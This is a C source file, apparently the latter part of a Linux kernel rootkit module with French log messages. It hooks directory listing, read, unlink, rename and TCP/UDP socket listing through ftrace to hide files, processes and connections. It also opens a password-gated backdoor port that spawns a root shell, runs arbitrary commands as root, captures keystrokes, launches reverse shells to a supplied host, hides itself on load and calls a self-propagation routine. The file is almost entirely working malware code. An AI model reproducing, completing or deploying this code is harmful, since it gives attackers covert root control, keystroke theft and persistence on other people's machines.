        unlink_hook.ops.func = NULL;
        return ret;
    }
    return 0;
}

static void uninstall_unlink_hook(void)
{
    if (unlink_hook.ops.func)
        unregister_ftrace_function(&unlink_hook.ops);
    if (unlink_hook.address)
        ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 1, 0);
}

static int install_rename_hook(kallsyms_lookup_name_t lookup)
{
    int ret;

    rename_hook.name = "__x64_sys_renameat2";
    rename_hook.function = new_renameat2;
    rename_hook.original = &orig_renameat2;
    rename_hook.address = lookup(rename_hook.name);

    if (!rename_hook.address) {
        pr_err("[-] Symbol not found: __x64_sys_renameat2\n");
        return -ENOENT;
    }
    pr_info("[+] __x64_sys_renameat2 @ 0x%lx\n", rename_hook.address);
    orig_renameat2 = (orig_renameat2_t)rename_hook.address;

    rename_hook.ops.func = hook_callback;
    rename_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 0, 0);
    if (ret) return ret;

    ret = register_ftrace_function(&rename_hook.ops);
    if (ret) {
        ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
        rename_hook.ops.func = NULL;
        return ret;
    }
    return 0;
}

static void uninstall_rename_hook(void)
{
    if (rename_hook.ops.func)
        unregister_ftrace_function(&rename_hook.ops);
    if (rename_hook.address)
        ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
}

#ifdef CONFIG_NET
static int install_udp_hook(kallsyms_lookup_name_t lookup)
{
    int ret;

    udp_seq_hook.name = "udp4_seq_show";
    udp_seq_hook.function = new_udp4_seq_show;
    udp_seq_hook.original = NULL;
    udp_seq_hook.address = lookup(udp_seq_hook.name);

    if (!udp_seq_hook.address) {
        pr_err("[-] Symbol not found: udp4_seq_show\n");
        return -ENOENT;
    }
    pr_info("[+] udp4_seq_show @ 0x%lx\n", udp_seq_hook.address);
    udp_seq_hook.original = (void *)udp_seq_hook.address;

    udp_seq_hook.ops.func = hook_callback;
    udp_seq_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 0, 0);
    if (ret) return ret;

    ret = register_ftrace_function(&udp_seq_hook.ops);
    if (ret) {
        ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
        udp_seq_hook.ops.func = NULL;
        return ret;
    }
    return 0;
}

static void uninstall_udp_hook(void)
{
    if (udp_seq_hook.ops.func)
        unregister_ftrace_function(&udp_seq_hook.ops);
    if (udp_seq_hook.address)
        ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
}
#endif /* CONFIG_NET */

/**
 * The function `install_hook` sets up a hook for the `__x64_sys_getdents64` system call using kprobes
 * and ftrace in the Linux kernel.
 *
 * @return The `install_hook` function returns an integer value. If the function executes successfully,
 * it returns 0. If there are any errors during the execution of the function, it returns the
 * corresponding error code.
 */

/**
 * @brief   Registers new_read as an ftrace hook on __x64_sys_read.
 *
 * @details Resolves the address of __x64_sys_read via the lookup
 *          pointer provided by install_hook(). Configures the
 *          read_hook structure and registers it with ftrace to
 *          intercept all sys_read calls system-wide.
 *          Must be called from rootkit_init() after install_hook().
 *
 * @param   lookup  Pointer to kallsyms_lookup_name, provided by
 *                  install_hook() after resolution via kprobe.
 *
 * @return  0 on success.
 *          -ENOENT if __x64_sys_read symbol is not found.
 *          Negative error code if ftrace_set_filter_ip or
 *          register_ftrace_function fail.
 */
static int install_hook(void)
{
    kallsyms_lookup_name_t lookup;
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0)
    {
        pr_err("[-] register_kprobe: %d\n", ret);
        return ret;
    }
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    getdents_hook.name = "__x64_sys_getdents64";
    getdents_hook.function = new_getdents64;
    getdents_hook.original = &orig_getdents64;

    getdents_hook.address = lookup(getdents_hook.name);
    if (!getdents_hook.address)
    {
        pr_err("[-] Symbol not found\n");
        return -ENOENT;
    }
    pr_info("[+] %s @ 0x%lx\n", getdents_hook.name, getdents_hook.address);

    orig_getdents64 = (orig_getdents64_t)getdents_hook.address;

    getdents_hook.ops.func = hook_callback;
    getdents_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 0, 0);
    if (ret)
    {
        pr_err("[-] ftrace_set_filter_ip: %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&getdents_hook.ops);
    if (ret)
    {
        pr_err("[-] register_ftrace_function: %d\n", ret);
        ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
        getdents_hook.ops.func = NULL;
        return ret;
    }

    install_read_hook(lookup);
#ifdef CONFIG_NET
    install_tcp_hook(lookup);
#endif
    install_unlink_hook(lookup);
    install_rename_hook(lookup);
#ifdef CONFIG_NET
    install_udp_hook(lookup);
#endif
    return 0;
}

/**
 * @brief   Unregisters the ftrace hook on __x64_sys_read.
 *
 * @details Calls unregister_ftrace_function() then clears the
 *          address filter with ftrace_set_filter_ip(). Must be
 *          called from rootkit_exit() before misc_deregister().
 *          Without this call, the hook stays active after rmmod
 *          and causes a kernel crash (call to unloaded address).
 *
 * @return  void
 *
 * @warning Do not omit this call in rootkit_exit(). An ftrace hook
 *          not removed at module unload causes a kernel panic.
 */
static void uninstall_read_hook(void)
{
    if (read_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&read_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
        }
    }
    if (read_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
        }
    }
}

/**
 * The function `uninstall_tcp_hook` is responsible for unregistering a ftrace function related to TCP
 * and clearing the ftrace filter.
 */
#ifdef CONFIG_NET
static void uninstall_tcp_hook(void)
{
    if (tcp_seq_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&tcp_seq_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (tcp) (%d)\n", ret);
        }
    }
    if (tcp_seq_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (tcp) (%d)\n", ret);
        }
    }
}
#endif /* CONFIG_NET */

#ifdef CONFIG_NET
/**
 * The function `handle_backdoor_connection` accepts a connection, receives a message, and executes a
 * shell if the received message matches a predefined password.
 * 
 * @return The function `handle_backdoor_connection` returns an integer value, which is 0 in this case.
 */
static int handle_backdoor_connection(void)
{
    struct socket *client_sock;
    struct msghdr msg = {0};
    char buf[32] = {0};
    struct kvec vec = {.iov_base = buf, .iov_len = sizeof(buf) - 1};
    int ret = 0;
    int len = 0;

    ret = kernel_accept(backdoor_sock, &client_sock, O_NONBLOCK);

    if (ret == -EAGAIN)
        return -EAGAIN;
    if (ret < 0)
        return ret;

    len = kernel_recvmsg(client_sock, &msg, &vec, 1, sizeof(buf), 0);
    if (len <= 0)
        goto close_client;

    if (strlen(backdoor_password) > 0 && strncmp(buf, backdoor_password,
        strlen(backdoor_password)) == 0) {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
        call_usermodehelper("/bin/sh", argv, envp, UMH_NO_WAIT);
    }

    close_client:
        sock_release(client_sock);
    return 0;
}

/**
 * The function `backdoor_thread_fn` runs a loop to handle backdoor connections until the thread is
 * stopped.
 * 
 * @param data In the provided code snippet, the `data` parameter is a void pointer that is passed to
 * the `backdoor_thread_fn` function. This parameter can be used to pass any additional data or context
 * information required by the thread function. In this case, it seems that the `data` parameter is
 * 
 * @return The function `backdoor_thread_fn` is returning an integer value of 0.
 */
static int backdoor_thread_fn(void *data)
{
    int ret = 0;
    while (!kthread_should_stop()) {
        ret = handle_backdoor_connection();
        if (ret == -EAGAIN || ret < 0)
            msleep(100);
    }
    return 0;
}

/**
 * The function `close_backdoor_port` closes a backdoor port if it is open.
 */
static void close_backdoor_port(void)
{
    if (backdoor_thread) {
        kthread_stop(backdoor_thread);
        backdoor_thread = NULL;
    }

    if (backdoor_sock) {
        sock_release(backdoor_sock);
        backdoor_sock = NULL;
        backdoor_port = 0;
        pr_info("[+] Backdoor fermée\n");
    }
}

/**
 * The function `open_backdoor_port` creates a TCP socket, binds it to a specified port, and listens
 * for incoming connections.
 * 
 * @param port The `port` parameter in the `open_backdoor_port` function is an integer that specifies
 * the port number on which the backdoor will be opened for communication.
 * 
 * @return The function `open_backdoor_port` returns an integer value. If the function is successful in
 * opening the backdoor port, it returns 0. If there is an error during the process, it returns a
 * negative value indicating the error code.
 */
static int open_backdoor_port(int port)
{
    struct sockaddr_in addr;
    int ret;

    close_backdoor_port();
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &backdoor_sock);
    if (ret < 0)
        return ret;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 9, 0)
    ret = kernel_bind(backdoor_sock, (struct sockaddr_unsized *)&addr, sizeof(addr));
#else
    ret = kernel_bind(backdoor_sock, (struct sockaddr *)&addr, sizeof(addr));
#endif
    if (ret < 0)
        goto out;

    ret = kernel_listen(backdoor_sock, 1);
    if (ret < 0)
        goto out;

    backdoor_thread = kthread_run(backdoor_thread_fn, NULL, "backdoor_thread");
    if (IS_ERR(backdoor_thread)) {
        backdoor_thread = NULL;
        printk(KERN_ERR "rootkit: failed to create backdoor thread\n");
    }

    backdoor_port = port;
    pr_info("[+] Backdoor ouverte sur le port %d\n", port);
    return 0;

    out:
        sock_release(backdoor_sock);
        backdoor_sock = NULL;
    return ret;
}
#endif /* CONFIG_NET */


/**
 * The function `escalation_thread_fn` executes a shell command passed as a parameter in user mode.
 * 
 * @param data The `data` parameter in the `escalation_thread_fn` function is a void pointer that is
 * cast to a char pointer (`char *`). It is used to pass a command (cmd) that will be executed by
 * `/bin/sh` in the user space.
 * 
 * @return The function `escalation_thread_fn` is returning an integer value of 0.
 */
static int escalation_thread_fn(void *data)
{
    char *cmd = (char *)data;
    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(cmd);
    return 0;
}


/**
 * The function `handle_escalation` in the given code snippet handles privilege escalation
 * by executing a command as root.
 * 
 * @param args The `handle_escalation` function takes a pointer to a `struct rk_args` named `args` as a
 * parameter. This structure likely contains information needed for privilege escalation, such as the
 * method of escalation (`value`), the target process ID or command, etc.
 * 
 * @return The function `handle_escalation` returns an integer value. In the different scenarios within
 * the function, it returns different error codes or success codes based on the outcome of the
 * operations.
 */
static int handle_escalation(struct rk_args *args)
{
    if (args->value ==  RK_PRIVESC_BY_CMD) {
        char __user *cmd_user = (char __user *)args->target;
        char *cmd_kernel;
        struct task_struct *task;

        cmd_kernel = strndup_user(cmd_user, MAX_CMD_LEN);
        if (IS_ERR(cmd_kernel)) {
            return PTR_ERR(cmd_kernel);
        }

        task = kthread_run(escalation_thread_fn, cmd_kernel, "kworker/rk_proc");
        if (IS_ERR(task)) {
            kfree(cmd_kernel);
            return PTR_ERR(task);
        }
        return 0;
    } else {
        printk(KERN_ERR "rootkit: invalid escalation method %u\n", args->value);
        return -EINVAL;
    }
    return 0;
}

/**
 * The function `rk_ioctl` handles different commands related to a rootkit, such as privilege
 * escalation, hiding a process ID, and retrieving the user ID.
 *
 * @param file The `file` parameter in the `rk_ioctl` function represents a pointer to a structure that
 * contains information about the opened file. This structure typically includes details such as the
 * file descriptor, file operations, and other file-related information. In the context of the
 * `rk_ioctl` function, this parameter is
 * @param cmd The `cmd` parameter in the `rk_ioctl` function represents the command that is being
 * passed to the ioctl system call. It is an unsigned integer that is used to determine the specific
 * operation that the driver should perform. The driver checks the type of the command using
 * `_IOC_TYPE(cmd)` and then
 * @param arg The `arg` parameter in the `rk_ioctl` function represents the argument passed to the
 * ioctl system call. It is of type `unsigned long` and is used to pass data between user space and
 * kernel space. In this function, it is being used to receive a pointer to `struct rk_args
 *
 * @return The function `rk_ioctl` returns an integer value. In the provided code snippet, if the
 * command `cmd` does not match the predefined `RK_MAGIC` value, it returns `-ENOTTY`. If the command
 * matches one of the defined cases (`RK_CMD_HELLO`, `RK_CMD_PRIVESC`, `RK_CMD_HIDE_PID`,
 * `RK_CMD_GETUID`), it performs specific actions
 */
static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct rk_args args;

    if (_IOC_TYPE(cmd) != RK_MAGIC) {
        return -ENOTTY;
    }

    if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args))) {
        return -EFAULT;
    }
    mutex_lock(&rk_mutex);
    
    switch (cmd) {
    case RK_CMD_PRIVESC:
        printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
        handle_escalation(&args);
        mutex_unlock(&rk_mutex);
        break;

    case RK_CMD_HIDE_PID:
        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
        add_hidden_pid((pid_t)args.target);
        break;

    case RK_CMD_UNHIDE_PID:
        printk(KERN_INFO "rootkit: UNHIDE_PID pour PID=%lu\n", args.target);
        remove_hidden_pid((pid_t)args.target);
        break;

    case RK_CMD_GETUID:
        args.target = (unsigned int)current_uid().val;
        args.value = 0;
        printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
        break;

    case RK_CMD_SET_MSG:
        if (strncpy_from_user(rk_msg,
                              (const char __user *)(unsigned long)args.target,
                              RK_MSG_MAX - 1) < 0)
            return -EFAULT;

        rk_msg[RK_MSG_MAX - 1] = '\0';
        break;
        
#ifdef CONFIG_NET
    case RK_CMD_OPEN_BACKDOOR:
        if (open_backdoor_port((int)args.target) < 0)
            return -EFAULT;
        break;

    case RK_CMD_SET_BACKDOOR_PASS:
        if (strncpy_from_user(backdoor_password,
                            (const char __user *)(unsigned long)args.target,
                            BACKDOOR_PASS_MAX - 1) < 0)
            return -EFAULT;

        backdoor_password[BACKDOOR_PASS_MAX - 1] = '\0';
        break;
#endif /* CONFIG_NET */

    case RK_CMD_HIDE_MODULE:
        hide_module();
        break;

    case RK_CMD_SHOW_MODULE:
        show_module();
        break;

    case RK_CMD_TOGGLE_KEYLOG:
        keylog_enabled = !keylog_enabled;
        printk(KERN_INFO "rootkit: keylogger %s\n",
               keylog_enabled ? "enabled" : "disabled");
        break;

    case RK_CMD_GET_KEYLOG: {
        unsigned long flags;
        spin_lock_irqsave(&keylog_lock, flags);

        if (keylog_pos > 0) {
            size_t to_copy = keylog_pos;
            if (to_copy > RK_MSG_MAX - 1)
                to_copy = RK_MSG_MAX - 1;
            if (copy_to_user((char __user *)args.target,
                             keylog_buf, to_copy)) {
                spin_unlock_irqrestore(&keylog_lock, flags);
                return -EFAULT;
            }
            /* flush buffer after read */
            keylog_pos = 0;
            keylog_buf[0] = '\0';
        }
        spin_unlock_irqrestore(&keylog_lock, flags);
        break;
    }

    case RK_CMD_HIDE_USER:
        if (args.target == 0) {
            hidden_user[0] = '\0';
            printk(KERN_INFO "rootkit: user unhidden\n");
        } else {
            if (strncpy_from_user(hidden_user,
                                  (const char __user *)args.target,
                                  HIDDEN_USER_MAX - 1) < 0)
                return -EFAULT;
            hidden_user[HIDDEN_USER_MAX - 1] = '\0';
            printk(KERN_INFO "rootkit: hiding user '%s'\n", hidden_user);
        }
        break;

    case RK_CMD_PROTECT_FILE: {
        char path[PROTECTED_PATH_MAX] = {0};
        unsigned long flags;
        if (strncpy_from_user(path, (const char __user *)args.target,
                              PROTECTED_PATH_MAX - 1) < 0)
            return -EFAULT;

        spin_lock_irqsave(&protect_lock, flags);
        if (protected_file_count >= MAX_PROTECTED_FILES) {
            spin_unlock_irqrestore(&protect_lock, flags);
            return -ENOSPC;
        }
        strscpy(protected_files[protected_file_count], path,
                PROTECTED_PATH_MAX);
        protected_file_count++;
        spin_unlock_irqrestore(&protect_lock, flags);
        printk(KERN_INFO "rootkit: protecting file '%s'\n", path);
        break;
    }

    case RK_CMD_UNPROTECT_FILE: {
        char path[PROTECTED_PATH_MAX] = {0};
        unsigned long flags;
        int i;
        if (strncpy_from_user(path, (const char __user *)args.target,
                              PROTECTED_PATH_MAX - 1) < 0)
            return -EFAULT;

        spin_lock_irqsave(&protect_lock, flags);
        for (i = 0; i < protected_file_count; i++) {
            if (strcmp(protected_files[i], path) == 0) {
                strscpy(protected_files[i],
                        protected_files[--protected_file_count],
                        PROTECTED_PATH_MAX);
                spin_unlock_irqrestore(&protect_lock, flags);
                printk(KERN_INFO "rootkit: unprotected file '%s'\n", path);
                return 0;
            }
        }
        spin_unlock_irqrestore(&protect_lock, flags);
        return -ENOENT;
    }

    case RK_CMD_REVERSE_SHELL: {
        char *target_str;
        struct task_struct *ts = NULL;
        target_str = kzalloc(RK_REVSHELL_MAX, GFP_KERNEL);
        if (!target_str)
            return -ENOMEM;

        if (strncpy_from_user(target_str, (const char __user *)args.target,
                              RK_REVSHELL_MAX - 1) < 0) {
            kfree(target_str);
            return -EFAULT;
        }
        printk(KERN_INFO "rootkit: launching reverse shell to %s\n", target_str);
        ts = kthread_run(reverse_shell_fn, target_str, "rk_revshell");
        
        if (IS_ERR(ts)) {
            printk(KERN_ERR "rootkit: failed to create reverse shell thread\n");
            kfree(target_str);
        }
        break;
    }

    default:
        mutex_unlock(&rk_mutex);
        return -ENOTTY;
    }
    mutex_unlock(&rk_mutex);
    return 0;
}

/**
 * The function `rk_open` restricts access based on user ID and logs messages accordingly.
 *
 * @param inode The `inode` parameter in the `rk_open` function is a pointer to a structure that
 * represents an inode in the Linux file system. The inode data structure contains metadata about a
 * file or directory, such as permissions, ownership, size, and pointers to data blocks.
 * @param file The `file` parameter in the `rk_open` function is a pointer to a structure of type
 * `struct file`. This structure represents an open file in the kernel and contains information about
 * the file, such as its file descriptor, file operations, and other relevant data.
 *
 * @return The function `rk_open` is returning an integer value. If the conditions are met (uid is not
 * 0 and not 1000), it will return `-EACCES` indicating a permission denied error. Otherwise, if the
 * conditions are not met, it will return `0` indicating success.
 */
static int rk_open(struct inode *inode, struct file *file)
{
    uid_t uid = current_uid().val;
    if (uid != 0 && uid != 1000)
    {
        printk(KERN_ALERT "rootkit: accès refusé à l'UID %u\n", uid);
        return -EACCES;
    }

    printk(KERN_INFO "rootkit: opened\n");
    return 0;
}

/**
 * The function `rk_release` is a static function in C that logs a message when a file is closed.
 *
 * @param inode The `inode` parameter in the `rk_release` function is a pointer to a structure that
 * represents an inode in the Linux kernel. The inode data structure contains metadata about a file or
 * directory, such as permissions, timestamps, and pointers to data blocks.
 * @param file The `file` parameter in the `rk_release` function is a pointer to a structure of type
 * `struct file`. This structure represents an open file in the kernel and contains information about
 * the file, such as its file descriptor, file operations, and other relevant data.
 *
 * @return The function `rk_release` is returning an integer value of 0.
 */
static int rk_release(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "rootkit: closed\n");
    return 0;
}

/* The above code is defining a static constant structure named `rk_fops` with file operations for a
Linux kernel module. The structure contains function pointers for opening a file (`open`), releasing
a file (`release`), and handling I/O control operations (`unlocked_ioctl`). The `owner` field is set
to `THIS_MODULE`, which is a macro that represents the module owning the file operations. */
static const struct file_operations rk_fops = {
    .owner = THIS_MODULE,
    .open = rk_open,
    .release = rk_release,
    .unlocked_ioctl = rk_ioctl,
};

/* The above code is defining a static struct `rk_misc` of type `miscdevice`. It initializes the
members of the struct with the following values:
- `minor` is set to `MISC_DYNAMIC_MINOR`
- `name` is set to `NAME_MODULE`
- `fops` is set to the address of the struct `rk_fops` */
static struct miscdevice rk_misc = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = NAME_MODULE,
    .fops = &rk_fops,
};

/**
 * The rootkit_init function registers a miscellaneous device and installs a hook, returning 0 if
 * successful.
 *
 * @return The `rootkit_init` function is returning an integer value. If the function executes
 * successfully without any errors, it will return 0. If there is an error during the registration of
 * the miscellaneous device or the installation of the hook, the corresponding error code will be
 * returned.
 */
static int __init rootkit_init(void)
{
    int ret;

    ret = misc_register(&rk_misc);
    if (ret) {
        printk(KERN_ERR "rootkit: misc_register failed (%d)\n", ret);
        return ret;
    }

    ret = install_hook();
    self_propagate();

    
    if (ret) {
        printk(KERN_ERR "[-] Erreur installation hooks\n");
        misc_deregister(&rk_misc);
        return -ENOENT;
    }

    ret = input_register_handler(&keylog_handler);
    if (ret)
        pr_warn("rootkit: keylogger handler registration failed (%d)\n", ret);

    /* Auto-hide module on load */
    hide_module();

    printk(KERN_INFO "rootkit: loaded — /dev/rootkit (minor=%d)\n",
        rk_misc.minor);
    return 0;
}

/**
 * The rootkit_exit function unregisters ftrace functions and clears filters before unloading the
 * rootkit module.
 */
static void __exit rootkit_exit(void)
{
    /* Restore module visibility so rmmod works cleanly */
    show_module();

    input_unregister_handler(&keylog_handler);

    if (getdents_hook.ops.func != NULL) {
        int ret = unregister_ftrace_function(&getdents_hook.ops);
        if (ret) {
            printk(KERN_ERR "rootkit: failed to unregister ftrace function (%d)\n", ret);
        }
    }

    if (getdents_hook.address != 0) {
        int ret = ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
        
        if (ret) {
            printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
        }
    }

    uninstall_read_hook();
#ifdef CONFIG_NET
    uninstall_tcp_hook();
#endif
    uninstall_unlink_hook();
    uninstall_rename_hook();
#ifdef CONFIG_NET
    uninstall_udp_hook();
#endif
    #ifdef CONFIG_NET
    close_backdoor_port();
    #endif
    synchronize_rcu();
    misc_deregister(&rk_misc);
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
